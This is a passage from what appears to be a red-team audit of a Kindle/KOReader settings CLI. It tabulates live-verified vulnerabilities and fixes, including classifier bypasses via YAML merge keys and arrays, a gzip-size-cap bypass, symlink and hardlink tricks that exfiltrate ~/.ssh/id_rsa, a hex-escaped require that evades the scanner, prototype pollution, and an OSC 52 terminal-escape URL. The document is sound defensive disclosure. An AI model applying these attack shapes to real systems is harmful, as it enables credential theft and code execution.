| **Catalog-file poisoning inverts W32/W34e MATCH gate + silences scanner** (S72, AAA-probe, live-verified 2026-04-24 — **High**, top of trust pyramid) | `src/catalog/reader.ts:109-134` `loadPluginCatalog` reads `data/catalog/plugins.bundled.v1.json` via plain `readFileSync` + Zod schema validation. **Zero file-level integrity check** — no embedded SHA, no signature, no pinning. `src/schema/settings.ts:41-48` same pattern for the settings schema JSON. Live probe: replaced `SSH.known_hashes["main.lua"]` with `sha256:<hash of attacker bytes>` → `verifyPluginAgainstCatalog` returns **MATCH** on attacker payload. Scanner suppression (`setup.ts:829`) also fires on poisoned MATCH → double-silence | **None today.** Single file swap inverts W32 MATCH, `--strict-imports` (requires MATCH), and W34e scanner advisory suppression simultaneously. No UI surface fires (unlike S3/S4 UNCATALOGUED). Threat model: supply-chain (compromised npm/bun/homebrew package), post-install tampering (shared dev machine), dotfiles-sync compromise. **Beats the §8.7 HMAC-marker proposal** — HMAC authenticates archives against a machine key, not the catalog against which scanner+hashes are checked; AAA attacks upstream. Fix: compile-time embedded `CATALOG_SHA256` constant in `reader.ts` source; loader computes + compares + throws. One-line change + build step. Folds into new §8.17 |
| **SECRET_PATHS / SENSITIVE_PATHS bypassed by YAML array wrapping and literal dotted-top-level keys** (S71, RRR-probe, live-verified 2026-04-24 — **High**) | `classify.ts:248` (and twins at `:115`, `:188`) short-circuit `!Array.isArray(v)` before recursing — SECRET/SENSITIVE path walk skips inside arrays. `classify.ts:158` `classifyKey` consults only `SECRET_KEYS`, not `SECRET_PATHS` — a single-key literal `"kosync.userkey"` passes. Confirmed leaks: (A) `settings.kosync: [{userkey: "…"}]` — array-of-object; (C) `settings["kosync.userkey"]: "…"` — dotted-literal. Variant B `{userkey: {nested: "…"}}` is clean (type-agnostic path check fires) | **None today.** Attacker YAML lands plaintext `kosync.userkey` / other SECRETs on device silently (gate doesn't fire). Chain: (1) smuggle via `apply`/`setup import`, (2) victim's future `kindly pull` also misses the bypass shape — credential re-emits in plaintext YAML. Silent SECRET introduction **and** silent re-emission. Same array-bypass hits SENSITIVE gate (setup-import path): kosync-array skips W31 fire. Fix: normalize input shape at YAML-load time — rewrite `{"kosync.userkey": v}` → `{kosync: {userkey: v}}` and recurse into arrays in the three classify walk sites. Folds into §8.12 — promotes that section from P2 parser-DoS to P1 SECRET integrity |
| **`--output` paths on `init` / `pull` / `snapshot` follow symlinks at the target** (S69, LLL-probe, live-verified 2026-04-24 — **Medium**) | `writeFileSync` (Node) opens `O_TRUNC\|O_WRONLY` — no `O_NOFOLLOW`. `existsSync` also traverses symlinks so `--force` bypasses guard against the target. Snapshot has no existence check. Three live-confirmed sites: `init.ts:51`, `pull.ts:54`, `archive.ts:64` (snapshot via `tar -czf`). S61 flagged this surface but said "self-inflicted for user-typed flag, low severity" — LLL elevates because the flag resolves *through* pre-seeded attacker symlinks | **None today.** Threat model: attacker with write access to user's cwd pre-seeds `./kindle.yaml → /target/to/clobber` + waits for `kindly` invocation. Realistic: shared machines, sync daemons, post-compromise persistence. Severity ordering: snapshot > pull > init (snapshot lands **plaintext SECRETs** at attacker's path — worst). Fix: `writeFileSecure(path, bytes)` wrapper at four sites (`init.ts:43`, `lib/pull.ts:42`, `snapshot.ts:57-59`, `lib/setupExport.ts:182-183`): `lstatSync` → reject symlink unless `--allow-symlink-output`; `O_NOFOLLOW` where supported; `chmod 0600` on output. Folds into §8.9 |
| **Hardlink on mount-side `settings.reader.lua` exfiltrates host file via pull + backup** (S70, OOO-probe, live-verified 2026-04-24 — **Medium**) | Sibling to S56 but via a distinct primitive — S56's proposed `lstatSync.isSymbolicLink()` fix **does not close this** because hardlinks share an inode, no directory-entry "link" to detect; `lstat` reports a regular file with `nlink > 1`. Live: hardlink `mount/koreader/settings.reader.lua → $HOME/.ssh/id_rsa` → `readFileSync` at `pull.ts:36` reads host content → sentinel lands in output YAML. `safeWrite.ts:78` `copyFileSync` also copies host content into `.kindly/backups/` (second exfil channel, persists 20 backups). Write side safe by accident: `renameSync` breaks the hardlink (new inode for `path`, host file preserved); but `.old` retains the hardlink for one apply cycle, narrow window for rollback re-promote | **None today.** Requires attacker with same-filesystem write access (no cross-fs hardlinks), so exclusively a desktop-live-head concern (macOS APFS / Linux ext4) — FAT32 Kindle USB doesn't support hardlinks. Fix: add `st.nlink > 1` check alongside S56's `isSymbolicLink()` at all 8 read sites. Same patch location, one extra predicate — `refusing hardlinked settings.reader.lua (nlink=N)`. Folds into S56's §8.14 scope |
| **gzip ISIZE 4 GiB wrap bypasses `enforceSizeCaps`** (S68, YY-probe, live-verified 2026-04-24 — **High**) | `src/fs/archive.ts:135-148` (`readGzipSizes`) parses `gzip -l`, which reports uncompressed size from the 4-byte ISIZE trailer — modulo 2³². Any tar.gz with ≥4 GiB actual uncompressed content has its size wrap, then slips through all three caps in `enforceSizeCaps` (`:153-183`). Live probe: 4.1 GiB bomb (`4,399,822,848` byte tar entry, 4.08 MiB compressed) reports ISIZE=100 MiB → passes 500 MiB cap; ratio=24.5:1 → passes 100:1 cap; archive-bytes=4 MiB → passes 100 MiB cap. `assertSafeArchive` returns success; `extractTarGz` (`:219` = `tar -xzf`) will write the full 4.1 GiB | **None today — first confirmed bypass of the A9/S-series bomb defense.** Reachable from `restore.ts:81` → `:136` (extract) and `setup/unpack.ts:83`. Disk-fill DoS on Kindle (~8 GiB internal storage) with an 8 GiB payload + 400 MiB uncompressed wrap remainder (still under cap, still ~8 MiB compressed). Fix: stream-decompress through a counting sink and abort at byte `cap+1` (authoritative, trailer-independent); secondary belt — sum `tar -tvzf` entry sizes and cross-check. Folds into A9 defense hardening scope |
| **`settings.reader.lua.old` live code-drop via dual-file fixture** (GGG-probe, live-verified 2026-04-24 — extends S49) | KOReader's `luasettings.lua:31-45` falls back to `settings.reader.lua.old` (`pcall(dofile, new.file..".old")`) whenever the main file's `dofile` returns `(ok=true, stored=nil)` — typically broken syntax, missing `return`, or `return nil`. `.old` is in `SNAPSHOT_PATHS` so kindly tars/restores/rolls it round-trip. Live probe on macOS emulator 2026-04-24 08:20: planted `settings.reader.lua = "return nil"` + `.old` containing top-level `do … io.open … end`; marker file written at boot, KOReader logged only `WARN LuaSettings: Failed reading ./settings.reader.lua (probably corrupted)` | **None today.** Stronger than S49's `defaults.custom.lua` primitive in three ways: (a) main-file payload invisible — schema validator on `settings.reader.lua` sees `return nil`, not the attacker Lua; (b) `.kset` shipping a `.old` sibling is prima facie suspect (KOReader generates it during its own atomic writes — no legitimate reason for an author to bundle one) → good lint signal; (c) `luasettings:37` `pcall` isolates failures, so KOReader boots cleanly after payload runs. Fix bundles with S49: SNAPSHOT_PATHS-wide code-drop gate, **and** explicit reject on `.old` in `.kset` archives unless explicit opt-in |
| **`bunfig.toml` in cwd is pre-exec RCE against every `kindly` invocation** (S81, LLL2-probe, live-verified 2026-04-24 — **High**) | kindly runs as `bun run src/cli.ts`; Bun reads `./bunfig.toml` from cwd on every invocation and honors `preload = [...]`. Attacker's preload runs **before** kindly's main parses argv. Compiled binary via `bun build --compile` does NOT fix this (verified live). `bun -c <path>` override does NOT suppress cwd bunfig (verified live) | **None today.** Pre-exec RCE with kindly's full permissions: mount RW, `.kindly/` write, history/trace append, HOME access for SSH keys/credentials. Same threat-model prerequisite as S56/S69/S70/S74 (attacker has cwd write); strictly worse outcome (arbitrary code vs. file-read bridging / single-file clobber / append oracle). Realistic scenarios: shared dev boxes, CI runners, cloned-project-dirs (S47-class "my Kindle setup" forum repo), sync daemons that cd into watched folders. **Upstream Bun design issue** — no clean fix without a Bun `BUN_CONFIG_SKIP=1` / `--no-config` flag. Interim: shell-wrapper that refuses to run if `./bunfig.toml` exists (limited: only protects the wrapper entrypoint, not `bun run src/cli.ts` directly). Must be documented in docs/87 threat-model callout |
| **YAML `<<:` merge keys smuggle values past SECRET/SENSITIVE classifier walks** (S79, JJJ-probe, live-verified 2026-04-24 — **High**) | `yaml` library at `parseYamlSafe` (`src/fs/yamlSafe.ts:42`) does NOT resolve `<<:` — stores as literal own-key with alias value as subtable. `classifyKey("<<")` → USER, `isSecretPath("kosync.<<")` → false. Third classifier-bypass shape after S71's array-wrap and dotted-literal | **None today.** Attacker YAML: `kosync: {<<: *evil, innocent: true}` with `&evil: {userkey: "ATTACKER…"}` → `kindly apply --file` + `setup import` both let it through, writer emits `["<<"] = {[userkey]=...}` on device, backups retain plaintext (S53 channel), `kindly pull` + `--json` re-leaks unredacted. KOReader's Lua treats `<<` as literal string key (no merge semantics) — payload doesn't hijack runtime `userkey`, but bytes land on device unredacted. Fix: input-shape normalizer at `parseYamlSafe` resolves `<<:` into own-keys before classify/merge sees it; same chokepoint handles S71's dotted-literal and array-wrap shapes. Promotes §8.12 from "parser guards" to "input normalizer owning three shapes" |
| **Cyclic YAML anchors reach S77 as a live exploit — `dumpSettingsFile` `RangeError`** (S80, JJJ-probe, live-verified 2026-04-24 — **Medium**) | `yaml` library materializes actually-cyclic graphs from `&a / *a` self-references. `parsed.root === parsed.root.child` → true; `dumpSettingsFile(parsed)` → `Maximum call stack size exceeded`. Promotes S77 from "defense-in-depth, not reachable" → "reachable via any path that takes attacker YAML → parse → writer" | **None today.** `kindly apply --file attacker.yaml` / `kindly setup import` on cyclic YAML → writer throws → exit 1 after merge has completed in memory but before device write. Push-button DoS of the mutation pipeline. No data written on device (writer throws before `writeFileSync`) but crash recurs on every apply until user removes cyclic YAML. Fix: S77's WeakSet + depth-cap landing at `serializeTable`; S79's input normalizer MUST also handle cycles (WeakSet at normalizer entry or structured-clone pass) — otherwise normalizer itself is DoS'd by cyclic input |
| **`.kindly/history.jsonl` + `.kindly/trace.jsonl` follow symlinks on read/write/append** (S74, CCC-probe, live-verified 2026-04-24 — **Medium**) | Zero `lstatSync`/`O_NOFOLLOW` in `src/history/reader.ts:59`, `src/history/writer.ts:169`, `src/cli/trace.ts:60`. Same pattern that S56 found on `settings.reader.lua`, now confirmed on the `.kindly/` cluster. Append oracle: symlink replacement lets attacker redirect audit-log writes to any user-writable file | **None today.** Attacker with write on user cwd pre-seeds `.kindly/history.jsonl → /target/to/append`. Every subsequent kindly mutation writes a JSON line to target. Read path chained with S63 (no Zod) → `rollback --to N` resolves to attacker-chosen `snapshot_dir` — fourth tar-ingestion RCE. Fix: shared `lstat`/`O_NOFOLLOW` helper folded into S56/S70's §8.14 scope — same pattern, adjacent call sites |
| **gzip multi-member archive hides non-final members from `enforceSizeCaps`** (S75, BBB-probe, live-verified 2026-04-24 — **Low**) | `readGzipSizes` at `archive.ts:136` parses `gzip -l` output which reports only the **last** member's ISIZE per RFC 1952 concat semantics. 11-member probe: 70 KB true uncompressed, 4 KB reported (17× undercount) | **Sibling to S68 but narrower.** Both bsdtar and GNU tar stop at the first embedded tar EOF marker → non-final members decompress through pipe but never hit disk. CPU/memory DoS only, not file-write amplification. Fix: scan for gzip magic `1f 8b` at offsets > 0 and refuse multi-member archives (legitimate `.tar.gz` workflows never produce them). Folds into §8.15 alongside the S68 stream-counting sink |
| **UTF-8 BOM in `settings.reader.lua`: KOReader strips, kindly throws** (S76, FFF-2-probe, live-verified 2026-04-24 — **Low**) | `src/lua/reader.ts` `skipWS` recognizes ASCII whitespace + `--` comments only. LuaJIT 2.1 auto-strips `EF BB BF`. Divergence: BOM + valid Lua parses fine on Kindle, fails with `LuaParseError` in every kindly command | **Not an attack surface — a support burden.** User edits settings in a BOM-emitting editor (historical Windows Notepad default, various legacy tools), device works, kindly breaks, user blames kindly. Fix: one-line BOM strip at `parseSettingsFile` entry. Folds into §8.12 |
| **No cycle detection in Lua writer** (S77, EEE-2-probe, live-verified 2026-04-24 — **Low, defense-in-depth**) | `serializeValue → serializeTable → serializeValue` in `src/lua/writer.ts` has zero `WeakSet`/depth-cap. Cyclic `LuaValue` → `RangeError: Maximum call stack size exceeded`. `mergeYamlIntoLua` at `yaml.ts:108-128` is structurally clean (object-spread fresh objects; acyclic parser inputs) | **No reachable exploit today** — all inputs come from text parsers that can't produce cycles. Severity is future-regression: any refactor introducing shared-reference reuse would silent-stack-overflow. Fix: `WeakSet<object>` seen-tracker + depth cap (64, pairs with S60's reader cap). Folds into §8.12 |
| **Concurrent snapshot/backup directory-stamp collision silently overwrites** (S78, GGG-2-probe, live-verified 2026-04-24 — **Low today, Medium once concurrent mutations fire**) | Millisecond-ISO stamps at `safeWrite.ts:74`, `snapshot.ts:59`, `restore.ts:120`, `importSetup.ts:712` with no random suffix. `mkdirSync({recursive:true})` merges; `copyFileSync` overwrites (no `COPYFILE_EXCL`). Live: 20 concurrent `safeWrite` → 8 unique dirs (12 clobbered); 5 concurrent `snapshot` → 4 files (1 clobbered) | **Low for Kindle single-user CLI workflow.** Medium-adjacent for docs/97 GUI + `kindly watch` + CI parallel tests — lost backups become routine once mutations fire concurrently. Combined with S67 (no file-lock) this is the backup-side hole that makes lost-write races unrecoverable. Fix: append `randomBytes(3).toString("hex")` suffix to every stamp; `COPYFILE_EXCL` + retry on `EEXIST`. Folds into §8.14 file-lock scope |
| **Lua reader prototype-pollution: `["__proto__"] = {...}` hides payload from all own-key walks** (S73, III-probe, live-verified 2026-04-24 — **Medium**) | `src/lua/reader.ts:257` does `obj[key] = val` on a plain `{}`. Key `"__proto__"` triggers the `Object.prototype.__proto__` setter → prototype swap, not own-key assignment. KOReader's Lua `dofile` stores `__proto__` as a literal string key (no proto semantics). Divergence confirmed live: `parseSettingsFile` on `{["__proto__"] = {terminal_shell="/bin/attacker"}, refresh_rate=5}` returns object where `Object.keys` → `["refresh_rate"]`, `Object.getPrototypeOf(p) !== Object.prototype`, but `p.terminal_shell === "/bin/attacker"` and `"terminal_shell" in p` | **None today — but no full exploit chain either.** Every kindly walk site uses `Object.entries`/`Object.keys` (classify.ts:113/116, yaml.ts:36/48/87/113/150/157/166, writer.ts:83) → payload is silently dropped at every layer, including the writer. Net effect: kindly's `apply` destroys prototype-smuggled fields on round-trip (integrity invariant broken: "apply is non-destructive on unmodified keys"), and any future code using `in`/direct-lookup/`for...in` on parsed settings would silently trust attacker data. Case C/D also pollute `hasOwnProperty`/`constructor` on the chain — DoS primitive for any code that calls `parsed.hasOwnProperty(...)` instead of `Object.prototype.hasOwnProperty.call`. Fix: `Object.create(null)` at `reader.ts:232` (one-line), or explicit reject of `__proto__`/`constructor`/`prototype` keys at parse. Folds into §8.12 |
| **Scanner evadable by Lua `\x`/`\###`/`\u{}` escape sequences in string literals** (S82, MMM-probe, live-verified 2026-04-24 — **High**) | `src/setup/luaScan.ts` patterns at `:88` (require net), `:96` (require ffi), `:121`/`:127` (os.remove/io.open abs-path) match literal bytes inside string quotes. `stripCommentsOnly` at `:150-216` walks string bodies but the `\`-branch at `:189-191` emits `\` + next char **verbatim** — no hex/decimal/unicode escape decoding. LuaJIT decodes all three at `dofile` → runtime sees `"socket"` while scanner residue contains the literal chars `\`,`x`,`7`,`3` | **None today — `require("\x73\x6f\x63\x6b\x65\x74")` passes scanner clean.** Collapses W36/W37 to a lexical theater check on plaintext module names. Breaks **before §W39 ships**: proposed trust-summary advisory scope is exactly the four regexes that MMM evades. Cheaper than S3 byte-table assembly (20 chars vs. 60). Fix: decode `\xHH`, `\###`, `\u{...}` during `stripCommentsOnly` walk. Does NOT close concatenation / `string.char` assembly — those are known dataflow limitations in docs/87 §2.2. Folds into §8.12 |
| **Lua reader silently coerces integers above 2⁵³ to nearest f64** (S83, PPP-probe, live-verified 2026-04-24 — **Low**) | `src/lua/reader.ts:219` parses numeric tokens via `Number(src.slice(…))`; no `Number.isSafeInteger` guard anywhere. `9007199254740993` → `9007199254740992` (−1); `2⁶⁰` → off by 24 | **None today — but no known KOReader key uses integers near 2⁵³ (largest typed-integer schema values are epoch-seconds ~1.7×10⁹ and byte-offsets ~10⁷).** LuaJIT default f64 matches kindly's behavior in the default build — divergence only fires if KOReader is compiled with `-DLJ_ARCH_NUMMODE=2`. Fix: `Number.isSafeInteger(n)` check on integer-shaped tokens, fail loudly instead of silently corrupting. Folds into §8.12 as one-line defense-in-depth |
| **`parseYamlSafe` honors `%YAML 1.1` directive, switching `<<:` merge semantics under attacker control** (S84, RRR2-probe, live-verified 2026-04-24 — **Medium**) | `src/fs/yamlSafe.ts:42` passes `{maxAliasCount: 100}` but no `version` — `yaml@2.8.3` defaults 1.2 but honors `%YAML 1.1` directive and switches parse tree accordingly. Under 1.1 `<<:` is resolved at parse time; under 1.2 it stays literal. Attacker picks which parser kindly uses by prepending 9 bytes of directive. Three parse sites affected: `yaml.ts:96`, `unpack.ts:92`, `importSetup.ts:67` | **None today.** Under 1.1 classifier DOES see flattened keys (gate fires on SECRET/SENSITIVE hits) — so this is not a gate-bypass like S79. Real severity is **reviewer-mental-model bypass**: reviewer scanning a `.kset` YAML parses it mentally as 1.2 (the lib default they think they know), misses a 9-byte directive at the top, audits `kosync: {<<: *evil}` as "literal `<<` key, inert", but kindly writes flattened `kosync.injected_key` to device. Plus cosmetic: writer at `yaml.ts:74` emits `<<` unquoted — safe under 1.2 but round-trip-dangerous if a downstream tool parses 1.1. Fix: one-line pin `version: '1.2'` in parseYamlSafe. Folds into §8.12, pairs with S79's input-shape normalizer |
| **YAML `!!binary` produces Node Buffer → 22× serialization amplification + shape-guard bypass** (S85, SSS-probe, live-verified 2026-04-24 — **High**) | `yaml@2.8.3` materializes `!!binary` as Node Buffer, `!!set` as Set, `!!timestamp` as Date, `!!omap` as Map. All four exclusion shape-guards in `src/schema/classify.ts` (`:115`, `:188`, `:248`) and `src/schema/yaml.ts` (`:117-122`, `:159-168`) use the same predicate `typeof === "object" && !Array.isArray && !(v instanceof Map)` — Buffer/Set/Date all pass. `Object.entries(Buffer)` yields numeric-string keys 0..N mapped to byte values → writer emits 15-char Lua entry per byte. Live probe: 7 MB YAML source at `parseYamlSafe` 10 MiB cap → **156 MB Lua output** (22× YAML, 29.8× Buffer bytes) | **None today.** Reachable via `apply --file`, `setup import`, `restore`. Per-apply disk footprint ~470 MB (`settings.reader.lua` + `.old` + `.kindly/backups/<ts>/settings.reader.lua`); 20 rotated backups × 470 MB = 10 GB = fully fills Kindle. On-device `pcall(dofile)` of 156 MB Lua source causes 10+ sec boot hang → potential fallback to `.old` sibling (S49/GGG code-drop). §8.15 scope is archive-decompression only; this bomb path (YAML → `yamlToLua` → `dumpSettingsFile` → `safeWrite`) is not covered. Secondary finding: `findSensitiveInValue` walking a Buffer at a SECRET_PATH parent (e.g. `kosync:`) sees numeric byte keys, misses `kosync.userkey` / `kosync.custom_server` / …, gate skipped. SECRET_KEYS top-level matches (e.g. `zlibrary_password: !!binary`) still fire correctly because the check is by key name, not value shape. Fix: reject non-plain-object YAML values at `parseYamlSafe` entry (or pass `customTags: []` + failsafe schema to disable non-core tags); add output-byte counter in `dumpSettingsFile` with 50 MiB cap matching §8.15's archive-uncompressed ceiling. Folds into §8.12 and widens §8.15 |
| **`history.jsonl` index collision under concurrent writers** (EE-probe, live-verified 2026-04-24) | `writer.ts:148-149` reads active entries then computes `highestIndexOf + 1` before `openSync(p, "a")` append at :169. O_APPEND prevents line-interleave/corruption; index *computation* is a read-modify-write with no lock. Racing writers see the same highest index → duplicate indexes. Live probe N=40 concurrent applies (re-run 2026-04-24): 36 persisted entries with 2 duplicate index pairs (indexes 21 and 24); first probe at N=40 saw 8 duplicates and N=20 saw 3 — collision count is non-deterministic but reliably >0 at ≥20 concurrent. `findHistoryEntryByIndex('/tmp/audit-EE2', 21)` returned the first match (backup stamp `…58-587Z`), silently ignoring the second (backup `…58-588Z`). `findHistoryEntryByIndex` (reader.ts:102-110) returns first match → **`rollback --to N` silently resolves to the wrong snapshot_dir**. `countAllHistory` dedupes → undercount → `rollback --to 20` falsely reports out-of-range when 20 entries actually exist | **Documented limitation per writer.ts:46-47, but the rollback misdirection consequence is new. Requires two genuinely-concurrent mutations in same cwd — unlikely in Kindle workflow but realistic once `kindly watch`/cron/GUI fire mutations in parallel (docs/97). Rotation triggered on `active.length` can straddle a collision window and cement duplicates in archive files permanently. Fix: `flock` the history file for the read-then-append window (same fix shape as S67), OR switch to UUID-based entry IDs and compute index lazily at read-time. Lower priority than S63 (forged entries) but the same JSONL file, same writer — worth bundling fixes** |

---

## 5. The honest threat model

Against **a skilled attacker shipping an obfuscated uncatalogued
plugin**, today's kindly **cannot defend the user** if they use
`--accept-plugins` without `--strict-imports`. This is not a bug the
scanner can fix — it's the fundamental limit of static analysis on a
dynamic language with full process-level access and no OS sandbox.

The scanner was specified (docs/93) for *median* attackers
(unobfuscated Lua in a zip file on a forum). S3 is above median. The
spec's "the reviewer is the backstop" assumption over-estimates how
carefully real users review plugin source before accepting.

---

## 6. Proposed hardening (v0.11.2 / W39–W41)

### W39 — make the trust decision explicit (highest ROI)

- **Flag semantics flip.** `--accept-plugins` implies strict mode:
  catalog MATCH required. Uncatalogued plugins require
  `--accept-community-plugins` (new flag). Closes S3's default path.
- **Scanner rebranded to advisory.** Rename "scanner findings" →
  "scanner advisories" in output. Add fixed-text banner: *"lexical
  scanner — a determined author can evade. Review the Lua yourself."*
  Kills false confidence.
- **Three narrow obfuscation patterns** (raise attacker cost, do not
  pretend completeness):
  - `require(<non-literal>)` — catches S3 directly
  - `_G\[["'](os|io|debug|package)["']\]` bracket indirection — catches S2
  - `string.char\s*\(` with ≥3 numeric literal args — byte-table
    assembly signal
  - New category: `suspected-obfuscation`. Zero FPs on the 17-plugin
    inventory (confirmed).
- Under `--accept-community-plugins`, ANY advisory requires
  `--ack-advisories` or interactive confirmation.

### W40 — community tier catalog

- `data/catalog/plugins.community.v1.json` — second catalog,
  community-vouched hashes. Seeded from docs/95 research. Start with
  ~10 most popular (LocalSend, assortedreader, KOSyncExtra, …).
- Verdict surface widens: `BUNDLED_MATCH`, `COMMUNITY_MATCH`,
  `UNKNOWN_PLUGIN`. `--accept-community-plugins` accepts first two
  silently; `UNKNOWN_PLUGIN` requires `--accept-unknown-plugin <name>`
  (per-plugin opt-in; forces a granular decision).

### W41 — quarantine + forensics

- **Quarantine flag.** `--accept-community-plugins --quarantine` ships
  the plugin with `plugins_disabled[<name>] = true`. User enables
  manually in KOReader's plugin manager after their own review.
- **Doctor awareness.** `kindly doctor` lists non-catalog plugins
  present on device with fingerprint + first-seen-date from
  `.kindly/history.jsonl`. Periodic re-review path.

### v0.13+ — author signing (the real long-term fix)

- Detached `.kset.sig` via minisign/age.
- Author key pinned in `.kindly/trusted_keys.json` on first use (TOFU).
- Trust decision shifts from "is this code safe" to "is this author's
  key". Same model every package manager converged on after they
  learned the hard way.

---

## 7. What remains un-fixable even after W41

A user who runs `--accept-community-plugins --ack-advisories
--accept-unknown-plugin evilthing` after reading three separate
warnings has made four explicit trust decisions. At that point the
defense is the same as `curl | sudo bash`: the user is vouching for
the code, and no tool can save them from themselves.

This limit should be named in docs/87 rather than hidden.

---

## 8. v0.11.2 minimum hardening (driven by confirmed exploits, not speculation)

Each item below is tied to a specific scenario that is reproducible
against `e8ce545` today. These are the *minimum* to close the holes
this red-team confirmed — not the full W39–W41 plan. Doing these
without also doing W39 leaves the trust-by-accept default untouched,
but they close every confirmed bypass.

### 8.1 Code changes in `src/schema/classify.ts`

Add to `SENSITIVE_KEYS`:

```
"terminal_shell",             // S9: C.execlp(shell, …) in terminal.koplugin
"screenshot_dir",             // consistency with *_dir cluster
"screensaver_dir",            //   "
"wikipedia_save_dir",         //   "
"cover_image_path",           //   "
"cover_image_fallback_path",  //   "
"cover_image_cache_path",     //   "
```

Add to `SENSITIVE_DOMAIN`:

```
terminal_shell: "code-exec",
screenshot_dir: "directory",
screensaver_dir: "directory",
wikipedia_save_dir: "directory",
cover_image_path: "directory",
cover_image_fallback_path: "directory",
cover_image_cache_path: "directory",
```

Introduce a new classification category for *plugin re-enable*
(S17/S27). `plugins_disabled` flipping `<name>: true` → `<name>: false`
(or removal in replace mode) must route through the SENSITIVE gate.
Cleanest implementation: a dedicated check in
`collectSensitiveFromSettings` that inspects
`settings.plugins_disabled` dict entries, emits a synthetic
`plugins_disabled.<name>=enable` SENSITIVE hit whenever the incoming
value is falsy. Domain `code-exec` for known-code-exec plugins
(`terminal`), `service` for daemon plugins (`SSH`, `httpinspector`,
`LocalSend`, `calibre`), `plugin` for the rest.

### 8.2 Patch-tier trust gate (S4)

The single most serious open hole. Patches are outside every existing
trust system. Minimum fix is option (2) from S4's mitigations list:
under `--strict-imports`, patches require explicit per-file hash
pinning via `--expect-patch-hash <sha256>:<path>` (repeatable flag).
Absent a matching pin, a patch in a strict-mode import is a policy
block, not a warning. Scanner output for patches changes wording from
"no novel findings" to "patch contents not verified — scanner is
advisory only".

### 8.3 Manifest identity-field sanitizer (S7 / S40 / S65 / KKK)

**KKK-probe 2026-04-24 refined the Zod-side gap.** `z.string().url()`
uses the WHATWG URL constructor, which accepts `\x1b` inside the
path segment — a crafted `source_url` with embedded OSC 52
(`https://evil/\x1b]52;c;<base64>\x07`) validates clean at Zod and
renders to stdout on `setup inspect` / `setup import` display paths
unescaped. Same mechanism for `z.string()` (no format validation at
all) on `meta.author` / `meta.description`. **10+ render sites in
`setup.ts:279-293` and `:718-740`** pass values through
`info()`/`warn()` with zero sanitization. JSON mode is safe
(`JSON.stringify` escapes `0x1b`); Zod error messages don't echo
raw values.

The sanitizer scope below now covers both the Zod bypass (ESC
survives validation) and the renderer bypass (no escaping at
emit).


`src/commands/setup.ts:279-288` writes `result.author`,
`result.sourceUrl`, `result.description`, and `result.name` straight
to stdout. Route these through the same C0/C1-stripping filter that
the settings-value renderer already uses (S25 is evidence this
filter exists and works). Reject or replace any byte in `0x00..0x1F`
except `\n`/`\t` and the C1 range `0x80..0x9F`. Enforce a max display
length per field; render each on its own line so `\r` or cursor-up
sequences cannot cross a following line.

### 8.4 Type-mismatch default + SECRET redaction across all diff renderers (S20 / S43b / S45 / S48)

`src/setup/import.ts` (or equivalent): type-mismatch on a known-typed
settings key becomes a policy-block (exit 3). Add
`--allow-type-mismatch` opt-out flag.

**Separately — the core hardening this section owns — every
change-renderer must route `prev`/`next` through a shared SECRET
redactor in `src/schema/classify.ts`.** Scope covers three output
paths, one helper:

1. **Apply human renderer** (`src/commands/apply.ts:91-100`
   `renderChange`): S43b live-verified, 5 victim plaintexts
   landed in `~ key "prev" → "next"` diff lines during
   `kindly apply --dry-run`.
2. **Diff human renderer** (`src/commands/diff.ts:84-96`
   `renderChange`): S45 verified, identical leak, worse framing
   because `diff` is the "safe preview" command and `git-diff`-
   style exit codes invite piping into CI / cron / log stores.
3. **JSON envelope** (`src/cli/json.ts:82` emitter):
   S48 live-verified, `apply --dry-run --json` and `diff --json`
   both serialize `prev`/`next` raw. `DiffResult.grouped`
   double-emits each change. JSON is the automation default —
   structured log stores (Splunk/Datadog/S3) retain values long-
   term. Generalization is load-bearing: JSON consumers are more
   likely to be *automated pipes* than humans, so this is the
   higher-blast-radius of the three.

Minimum shape of the shared helper:

```ts
// classify.ts
export function redactForDisplay(key: string, value: unknown): string {
    if (isSecret(key)) return `«redacted ${key}»`;
    return fmt(value);
}
```

Rule: **unconditional** — no `--show-secrets` flag. If a user
legitimately needs to see their own secret, they read
`settings.reader.lua` directly (an explicit machine-local action).
The leak channels are screenshots, paste-into-bug-reports, `tee`,
and piped JSON — none of which benefit from a flag.

Sub-item: the type-mismatch block must *also* call the redactor for
its "current value" column (original §8.4 scope). Merges into the
shared helper — no separate code path.

### 8.6 Share the SENSITIVE detector between `apply` and `setup import` (S38)

**Arguably the top 8.x item.** W31 (`collectSensitiveFromSettings`)
is wired into `src/setup/import.ts` only. `src/commands/apply.ts`
calls `mergeYamlIntoLua` with no SENSITIVE check. Result: plain
`kindly apply --file friend.yaml` lands every SENSITIVE key silently
at exit 0, including `terminal_shell`, `plugins_disabled.terminal`,
SSH settings, `ota_server`, and directory-redirection keys.

Minimum fix:

- Extract the sensitive-diff helper so both paths share it. Apply
  runs it on the post-merge settings diff.
- On hit: emit the same `[code-exec] terminal_shell …` / `[ssh] …`
  / `[directory] …` tagged lines that setup import emits, and
  require `--accept-sensitive` (plus per-key `--accept-key <name>`
  if setup's granular flag exists) before writing. No flag ⇒
  policy block (exit 3), mirroring W31.
- Dry-run output (`apply --dry-run`) shows the tagged lines too.

Without this, 8.1 (expanded SENSITIVE_KEYS) and the
plugin-re-enable classification only protect the `setup import`
path. The broader, more popular `apply` path stays silent.

**Sub-item: dual-gate semantics must survive the extraction (S42).**
`extra_plugin_paths` today is dual-gated under setup (`--accept-
sensitive` *and* `--accept-plugins` both required, per W31a). When
the shared helper fires in apply, it must preserve the dual gate
— not flatten to a single `--accept-sensitive`. Single-accept
under apply still leaves S42 open: a plain YAML user who's been
trained to answer "yes sensitive" for harmless-looking settings
changes would hand the attacker arbitrary plugin execution on any
filesystem path. Same dual-gate semantics that docs/88 §4.3
specifies for setup apply verbatim in apply.

**Sub-item: the shared helper must cover SECRETs, not just SENSITIVE (S43a).**
The classify.ts denylist distinguishes SECRET (credentials / PII,
always stripped on pull) from SENSITIVE (code-exec / network /
SSH, prompt-gated). Setup-import calls `filterForYaml(…, "full")`
which drops SECRETs from the incoming manifest entirely. Apply has
no such filter. The shared helper (or the apply path directly)
must: (a) detect SECRET overwrites in the incoming diff, (b)
default to policy-block (exit 3) on any SECRET overwrite, (c) gate
acceptance behind a per-key opt-in flag (`--accept-overwrite-
secret zlibrary_password`), matching the explicitness of setup-
side granularity. Silent credential overwrite should not be an
option any YAML-paste can reach.

**Sub-item: §8.4 generalizes to cover S43b.** §8.4 already calls
for the diff renderer to redact SECRET keys on the "current value"
side under type-mismatch. S43b demonstrates the leak fires on
every SECRET overwrite, not just type-mismatch. Generalize: in
`renderChange` (`src/commands/apply.ts:91-100`), call
